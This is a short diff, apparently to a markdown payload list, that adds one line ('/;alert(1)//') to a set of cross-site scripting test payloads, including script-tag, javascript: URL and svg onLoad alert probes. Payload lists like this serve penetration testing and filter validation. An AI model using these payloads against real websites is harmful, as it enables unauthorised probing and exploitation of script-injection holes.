@@ -16,6 +16,7 @@
 "></iframe><script>alert(123)</script>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <svg onLoad=alert(document.domain)>
+/;alert(1)//
 ```
 
 ## by Kira Reys
